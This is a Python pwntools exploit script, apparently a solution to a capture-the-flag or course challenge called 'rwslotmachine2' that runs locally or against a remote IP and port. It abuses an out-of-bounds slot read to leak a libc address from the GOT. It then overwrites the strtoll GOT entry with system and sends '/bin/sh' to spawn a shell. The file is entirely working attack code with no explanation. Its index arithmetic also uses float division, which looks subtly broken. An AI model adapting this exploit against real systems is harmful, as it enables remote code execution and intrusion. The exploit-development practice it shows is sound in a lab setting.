from pwn import *

local = True

if local:
    p = process("../src/rwslotmachine2")
    binary = p.elf
else:
    p = remote("141.85.224.117", 31345)
    binary = ELF("../src/rwslotmachine2")

libc = ELF("../src/libc.so.6")


def do_read(idx):
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b"index:")
    p.sendline(str(idx).encode())
    p.recvuntil(b"]: ")
    return int(p.recvuntil(b"\n")[:-1], 16)


def do_write(idx, value):
    p.recvuntil(b">")
    p.sendline(b"2")
    p.recvuntil(b"index:")
    p.sendline(str(idx).encode())
    p.recvuntil(b"value:")
    p.sendline(hex(value).encode())


slots_offset = binary.symbols["slots"]
strtoll_got_offset = binary.got["strtoll"]
puts_got_offset = binary.got["puts"]

index_to_puts = (puts_got_offset - slots_offset) / 4
index_to_strtoll = (strtoll_got_offset - slots_offset) / 4

libc_leak = do_read(index_to_puts)
print(f"Libc leak: {hex(libc_leak)}")

libc_base = libc_leak - libc.symbols["puts"]
print(f"Libc base: {hex(libc_base)}")

system = libc_base + libc.symbols["system"]
print(f"System address: {hex(system)}")

# Debugging the overwrite
print(f"Overwriting GOT entry for strtoll with address: {hex(system)}")

do_write(index_to_strtoll, system)
# Debugging shell spawn
print("Exploitation completed, sending /bin/sh...")


p.sendline(b"/bin/sh")

p.interactive()
